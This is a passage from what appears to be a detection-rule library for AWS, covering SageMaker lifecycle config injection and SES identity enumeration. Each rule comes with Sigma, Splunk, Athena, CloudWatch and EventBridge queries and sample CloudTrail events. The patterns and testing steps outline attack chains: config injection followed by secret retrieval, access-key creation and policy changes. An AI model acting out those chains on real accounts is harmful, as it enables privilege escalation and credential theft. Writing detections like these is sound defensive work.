    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.clusterName", "requestParameters.principalArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "CreateAccessEntry", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for EKS access management.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-admin role, call CreateAccessEntry or AssociateAccessPolicy.", "Verify detection triggers."],
  },

  // --- SageMaker Lifecycle Config Injection ---
  {
    id: "det-101",
    title: "Notebook Lifecycle Configuration Created or Updated",
    description: "Baseline visibility for lifecycle configuration changes. Lifecycle configs are security-sensitive because they execute code at startup, but admins may legitimately create them.",
    awsService: "SageMaker",
    relatedServices: [],
    severity: "Medium",
    tags: ["SageMaker", "Lifecycle Config", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate ML platform admin", "Approved lifecycle scripts"],
    rules: {
      sigma: `title: SageMaker Lifecycle Config Created or Updated
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: sagemaker.amazonaws.com
    eventName:
      - CreateNotebookInstanceLifecycleConfig
      - UpdateNotebookInstanceLifecycleConfig
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstanceLifecycleConfig)
| table _time, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'sagemaker.amazonaws.com'
  AND eventName IN ('CreateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstanceLifecycleConfig')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, sourceIPAddress
| filter eventSource = "sagemaker.amazonaws.com"
| filter eventName in ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceLifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "CreateNotebookInstanceLifecycleConfig", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { notebookInstanceLifecycleConfigName: "malicious-config" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and lifecycle config name.", "Verify if creation/update was authorized.", "Check for notebook association."],
    testingSteps: ["Create or update a lifecycle config.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-102",
    title: "Lifecycle Config Associated to Notebook Instance",
    description: "Detects when a notebook instance is created or updated with a lifecycle config attached. Association to a notebook instance is the moment the lifecycle config becomes operationally dangerous.",
    awsService: "SageMaker",
    relatedServices: [],
    severity: "High",
    tags: ["SageMaker", "Lifecycle Config", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate notebook provisioning", "Approved lifecycle association"],
    rules: {
      sigma: `title: Lifecycle Config Associated to Notebook Instance
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: sagemaker.amazonaws.com
    eventName:
      - CreateNotebookInstance
      - UpdateNotebookInstance
  filter_lifecycle:
    requestParameters.lifecycleConfigName|exists: true
  condition: selection and filter_lifecycle
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstance OR eventName=UpdateNotebookInstance)
| where isnotnull(requestParameters.lifecycleConfigName) AND requestParameters.lifecycleConfigName!=""
| table _time, userIdentity.arn, eventName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'sagemaker.amazonaws.com'
  AND eventName IN ('CreateNotebookInstance', 'UpdateNotebookInstance')
  AND requestParameters.lifecycleConfigName IS NOT NULL
  AND requestParameters.lifecycleConfigName != ''
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress
| filter eventSource = "sagemaker.amazonaws.com"
| filter eventName in ["CreateNotebookInstance", "UpdateNotebookInstance"]
| filter ispresent(requestParameters.lifecycleConfigName)
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstance", "UpdateNotebookInstance"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "UpdateNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target", lifecycleConfigName: "malicious-config" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the notebook and lifecycle config.", "Verify if association was authorized.", "Check for StartNotebookInstance shortly after."],
    testingSteps: ["Update notebook instance with lifecycle config.", "Verify detection triggers."],
  },
  {
    id: "det-103",
    title: "Suspicious Lifecycle Config Activity by Unexpected Actor",
    description: "Detects lifecycle config creation/update/association by identities that should not manage SageMaker notebook startup logic. Suspicious: IAM users outside ML platform admin, application roles, unexpected assumed roles.",
    awsService: "SageMaker",
    relatedServices: [],
    severity: "High",
    tags: ["SageMaker", "Lifecycle Config", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Approved ML platform automation", "Provisioning roles"],
    rules: {
      sigma: `title: Lifecycle Config Activity by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: sagemaker.amazonaws.com
    eventName:
      - CreateNotebookInstanceLifecycleConfig
      - UpdateNotebookInstanceLifecycleConfig
      - CreateNotebookInstance
      - UpdateNotebookInstance
  filter_known:
    userIdentity.arn|contains:
      - '/role/MLPlatform'
      - '/role/SageMaker'
      - '/role/Admin'
      - '/role/Platform'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstanceLifecycleConfig OR eventName=CreateNotebookInstance OR eventName=UpdateNotebookInstance)
| where NOT (like(userIdentity.arn, "%/role/MLPlatform%") OR like(userIdentity.arn, "%/role/SageMaker%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%"))
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'sagemaker.amazonaws.com'
  AND eventName IN ('CreateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstanceLifecycleConfig', 'CreateNotebookInstance', 'UpdateNotebookInstance')
  AND userIdentity.arn NOT LIKE '%/role/MLPlatform%'
  AND userIdentity.arn NOT LIKE '%/role/SageMaker%'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.notebookInstanceName, requestParameters.lifecycleConfigName
| filter eventSource = "sagemaker.amazonaws.com"
| filter eventName in ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "CreateNotebookInstance", "UpdateNotebookInstance"]
| filter userIdentity.arn not like /\\/role\\/(MLPlatform|SageMaker|Admin|Platform)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "CreateNotebookInstance", "UpdateNotebookInstance"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.notebookInstanceLifecycleConfigName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "UpdateNotebookInstance", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { notebookInstanceName: "target", lifecycleConfigName: "malicious" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for SageMaker lifecycle management.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-ML-platform role, create or update lifecycle config.", "Verify detection triggers."],
  },
  {
    id: "det-104",
    title: "Lifecycle Config Association Followed by Notebook Start or Update",
    description: "High-confidence execution preparation: lifecycle config created/updated or notebook updated to reference lifecycle config, then notebook start/restart shortly afterward. Models the execution path.",
    awsService: "SageMaker",
    relatedServices: [],
    severity: "High",
    tags: ["SageMaker", "Lifecycle Config", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate notebook start after config update", "Scheduled start"],
    rules: {
      sigma: `title: Lifecycle Config Association Followed by Notebook Start
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_config:
    eventSource: sagemaker.amazonaws.com
    eventName:
      - CreateNotebookInstanceLifecycleConfig
      - UpdateNotebookInstanceLifecycleConfig
      - UpdateNotebookInstance
  selection_start:
    eventSource: sagemaker.amazonaws.com
    eventName: StartNotebookInstance
  condition: 1 of selection_*
level: high
# Full correlation (notebook/actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sagemaker.amazonaws.com (eventName=CreateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstanceLifecycleConfig OR eventName=UpdateNotebookInstance OR eventName=StartNotebookInstance)
| eval actor=userIdentity.arn
| eval notebook=coalesce(requestParameters.notebookInstanceName, requestParameters.notebookInstanceLifecycleConfigName)
| eval is_config=if(eventName IN ("CreateNotebookInstanceLifecycleConfig","UpdateNotebookInstanceLifecycleConfig","UpdateNotebookInstance"), 1, 0)
| eval is_start=if(eventName="StartNotebookInstance", 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_config=1))>0 AND mvcount(mvfilter(is_start=1))>0
| table _time, actor, eventName, notebook`,
      cloudtrail: `WITH config_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS config_time
  FROM cloudtrail_logs
  WHERE eventSource = 'sagemaker.amazonaws.com'
    AND eventName IN ('CreateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstanceLifecycleConfig', 'UpdateNotebookInstance')
),
start_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS start_time, requestParameters.notebookInstanceName
  FROM cloudtrail_logs
  WHERE eventSource = 'sagemaker.amazonaws.com'
    AND eventName = 'StartNotebookInstance'
)
SELECT c.actor, c.config_time, s.start_time, s.notebookInstanceName
FROM config_evt c
JOIN start_evt s ON c.actor = s.actor
  AND s.start_time > c.config_time
  AND s.start_time <= c.config_time + INTERVAL '30' MINUTE
ORDER BY c.config_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.notebookInstanceName, requestParameters.notebookInstanceLifecycleConfigName, requestParameters.lifecycleConfigName
| filter eventSource = "sagemaker.amazonaws.com"
| filter eventName in ["CreateNotebookInstanceLifecycleConfig", "UpdateNotebookInstanceLifecycleConfig", "UpdateNotebookInstance", "StartNotebookInstance"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt >= 2
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["StartNotebookInstance"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "requestParameters.lifecycleConfigName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "StartNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify config/association and StartNotebookInstance sequence.", "Verify if start was authorized.", "Check notebook execution role for sensitive API use."],
    testingSteps: ["Update notebook with lifecycle config, then StartNotebookInstance within 30 min.", "Run Splunk or Athena correlation query."],
  },
  {
    id: "det-105",
    title: "Lifecycle Config Injection Followed by Sensitive Downstream Activity",
    description: "High-confidence privilege escalation: lifecycle config association/notebook start correlated with follow-on GetSecretValue, KMS decrypt, S3 GetObject, IAM policy changes, AssumeRole by notebook execution role or same actor.",
    awsService: "SageMaker",
    relatedServices: ["Secrets Manager", "KMS", "S3", "IAM", "STS"],
    severity: "Critical",
    tags: ["SageMaker", "Lifecycle Config", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate notebook workload using secrets/S3", "Expected ML pipeline"],
    rules: {
      sigma: `title: Lifecycle Config Injection Followed by Sensitive Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_sagemaker:
    eventSource: sagemaker.amazonaws.com
    eventName:
      - UpdateNotebookInstance
      - StartNotebookInstance
  selection_sensitive:
    eventName:
      - GetSecretValue
      - Decrypt
      - AssumeRole
      - CreateAccessKey
      - PutUserPolicy
      - AttachRolePolicy
  condition: 1 of selection_*
level: critical
# Full correlation (actor/notebook role, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=sagemaker.amazonaws.com AND eventName IN ("UpdateNotebookInstance","StartNotebookInstance")) OR (eventName=GetSecretValue OR eventName=Decrypt OR eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=PutUserPolicy OR eventName=AttachRolePolicy))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_sagemaker=if(eventSource="sagemaker.amazonaws.com" AND eventName IN ("UpdateNotebookInstance","StartNotebookInstance"), 1, 0)
| eval is_sensitive=if(eventName IN ("GetSecretValue","Decrypt","AssumeRole","CreateAccessKey","PutUserPolicy","AttachRolePolicy"), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_sagemaker=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.notebookInstanceName`,
      cloudtrail: `WITH sagemaker_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS sm_time
  FROM cloudtrail_logs
  WHERE eventSource = 'sagemaker.amazonaws.com'
    AND eventName IN ('UpdateNotebookInstance', 'StartNotebookInstance')
),
sensitive_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('GetSecretValue', 'Decrypt', 'AssumeRole', 'CreateAccessKey', 'PutUserPolicy', 'AttachRolePolicy')
)
SELECT s.actor, s.sm_time, e.use_time, e.eventName
FROM sagemaker_evt s
JOIN sensitive_evt e ON s.actor = e.actor
  AND e.use_time > s.sm_time
  AND e.use_time <= s.sm_time + INTERVAL '30' MINUTE
ORDER BY s.sm_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.notebookInstanceName
| filter (eventSource = "sagemaker.amazonaws.com" and eventName in ["UpdateNotebookInstance", "StartNotebookInstance"])
  or eventName in ["GetSecretValue", "Decrypt", "AssumeRole", "CreateAccessKey", "PutUserPolicy", "AttachRolePolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.sagemaker"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sagemaker.amazonaws.com"], eventName: ["UpdateNotebookInstance", "StartNotebookInstance"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "sagemaker.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.notebookInstanceName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "sagemaker.amazonaws.com", eventName: "StartNotebookInstance", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { notebookInstanceName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify SageMaker activity and sensitive API sequence.", "Verify if notebook execution role performed expected vs malicious API calls.", "Check lifecycle config content."],
    testingSteps: ["Start notebook with malicious lifecycle config, then have execution role call GetSecretValue.", "Run Splunk or Athena correlation query."],
  },

  // --- SES Identity Enumeration ---
  {
    id: "det-106",
    title: "SES Identity Enumeration Visibility",
    description: "Baseline visibility for SES identity listing or verification-attribute retrieval. These are reconnaissance-style read APIs; use Medium if SES is rare in the environment.",
    awsService: "SES",
    relatedServices: [],
    severity: "Medium",
    tags: ["SES", "Reconnaissance", "Identity Enumeration"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate email admin", "SES automation", "Monitoring"],
    rules: {
      sigma: `title: SES Identity Enumeration Visibility
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ses.amazonaws.com
    eventName:
      - ListIdentities
      - GetIdentityVerificationAttributes
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ses.amazonaws.com (eventName=ListIdentities OR eventName=GetIdentityVerificationAttributes)
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.identityType, requestParameters.identities, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.identityType, requestParameters.identities, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ses.amazonaws.com'
  AND eventName IN ('ListIdentities', 'GetIdentityVerificationAttributes')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.identityType, requestParameters.identities, sourceIPAddress
| filter eventSource = "ses.amazonaws.com"
| filter eventName in ["ListIdentities", "GetIdentityVerificationAttributes"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.identityType", "requestParameters.identities", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and enumeration scope.", "Verify if enumeration was authorized.", "Check for burst or follow-on SES abuse."],
    testingSteps: ["Call ListIdentities or GetIdentityVerificationAttributes.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-107",
    title: "Burst SES Identity Enumeration",
    description: "Detects unusual enumeration volume or burst behavior. Reconnaissance often appears as rapid repeated list/get calls rather than a single read. Threshold on repeated enumeration by same actor within a short time window.",
    awsService: "SES",
    relatedServices: [],
    severity: "High",
    tags: ["SES", "Reconnaissance", "Burst"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate bulk verification", "SES sync automation"],
    rules: {
      sigma: `title: Burst SES Identity Enumeration
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ses.amazonaws.com
    eventName:
      - ListIdentities
      - GetIdentityVerificationAttributes
  condition: selection
level: high
# Threshold: >5 calls in 5 min by same actor. Implement in SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ses.amazonaws.com (eventName=ListIdentities OR eventName=GetIdentityVerificationAttributes)
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| bucket _time span=5m
| stats count as cnt by actor, _time
| where cnt > 5
| table _time, actor, cnt`,
      cloudtrail: `SELECT actor, time_bucket, cnt
FROM (
  SELECT userIdentity.arn AS actor,
    date_trunc('minute', eventTime) AS time_bucket,
    COUNT(*) AS cnt
  FROM cloudtrail_logs
  WHERE eventSource = 'ses.amazonaws.com'
    AND eventName IN ('ListIdentities', 'GetIdentityVerificationAttributes')
  GROUP BY 1, 2
  HAVING COUNT(*) > 5
) t
ORDER BY cnt DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName
| filter eventSource = "ses.amazonaws.com"
| filter eventName in ["ListIdentities", "GetIdentityVerificationAttributes"]
| stats count(*) as cnt by userIdentity.arn, bin(5m)
| filter cnt > 5
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "GetIdentityVerificationAttributes", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { identities: ["user1@domain.com", "user2@domain.com"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and enumeration volume.", "Verify if burst was authorized.", "Check for follow-on SES or identity abuse."],
    testingSteps: ["Call GetIdentityVerificationAttributes repeatedly (>5 in 5 min).", "Run Splunk or Athena threshold query."],
  },
  {
    id: "det-108",
    title: "SES Identity Enumeration by Unexpected Actor",
    description: "Detects SES reconnaissance by identities that normally should not interact with SES identity-management APIs. Suspicious: IAM users outside messaging/email admin, application roles that do not manage SES, compromised compute roles.",
    awsService: "SES",
    relatedServices: [],
    severity: "High",
    tags: ["SES", "Reconnaissance", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known email/messaging admin", "SES automation roles"],
    rules: {
      sigma: `title: SES Identity Enumeration by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ses.amazonaws.com
    eventName:
      - ListIdentities
      - GetIdentityVerificationAttributes
  filter_known:
    userIdentity.arn|contains:
      - '/role/SES'
      - '/role/Email'
      - '/role/Messaging'
      - '/role/Admin'
      - '/user/ses'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ses.amazonaws.com (eventName=ListIdentities OR eventName=GetIdentityVerificationAttributes)
| where NOT (like(userIdentity.arn, "%/role/SES%") OR like(userIdentity.arn, "%/role/Email%") OR like(userIdentity.arn, "%/role/Messaging%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/user/ses%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ses.amazonaws.com'
  AND eventName IN ('ListIdentities', 'GetIdentityVerificationAttributes')
  AND userIdentity.arn NOT LIKE '%/role/SES%'
  AND userIdentity.arn NOT LIKE '%/role/Email%'
  AND userIdentity.arn NOT LIKE '%/role/Messaging%'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/user/ses%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, sourceIPAddress
| filter eventSource = "ses.amazonaws.com"
| filter eventName in ["ListIdentities", "GetIdentityVerificationAttributes"]
| filter userIdentity.arn not like /\\/role\\/(SES|Email|Messaging|Admin)/ and userIdentity.arn not like /\\/user\\/ses/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ses"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ses.amazonaws.com"], eventName: ["ListIdentities", "GetIdentityVerificationAttributes"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ses.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ses.amazonaws.com", eventName: "ListIdentities", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { identityType: "EmailAddress" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for SES identity management.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-SES role, call ListIdentities.", "Verify detection triggers."],
  },
  {
    id: "det-109",
    title: "SES Enumeration Followed by SES or Credential Abuse",
    description: "High-confidence recon-to-action: ListIdentities/GetIdentityVerificationAttributes then shortly afterward same actor performs SES identity/policy changes, IAM CreateAccessKey, or other follow-on abuse.",
    awsService: "SES",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["SES", "Reconnaissance", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate enumeration followed by expected SES changes"],
    rules: {
      sigma: `title: SES Enumeration Followed by Abuse
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_enum:
    eventSource: ses.amazonaws.com
    eventName:
      - ListIdentities
      - GetIdentityVerificationAttributes
  selection_abuse:
    eventSource: ses.amazonaws.com
    eventName:
      - PutIdentityPolicy
      - SetIdentityNotificationTopic
      - VerifyEmailIdentity
  selection_iam:
    eventName: CreateAccessKey
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ses.amazonaws.com AND eventName IN ("ListIdentities","GetIdentityVerificationAttributes")) OR (eventSource=ses.amazonaws.com AND eventName IN ("PutIdentityPolicy","SetIdentityNotificationTopic","VerifyEmailIdentity")) OR eventName="CreateAccessKey")
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_enum=if(eventSource="ses.amazonaws.com" AND eventName IN ("ListIdentities","GetIdentityVerificationAttributes"), 1, 0)
| eval is_abuse=if((eventSource="ses.amazonaws.com" AND eventName IN ("PutIdentityPolicy","SetIdentityNotificationTopic","VerifyEmailIdentity")) OR eventName="CreateAccessKey", 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_enum=1))>0 AND mvcount(mvfilter(is_abuse=1))>0
| table _time, actor, eventName`,
      cloudtrail: `WITH enum_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS enum_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ses.amazonaws.com'
    AND eventName IN ('ListIdentities', 'GetIdentityVerificationAttributes')
),
abuse_evt AS (
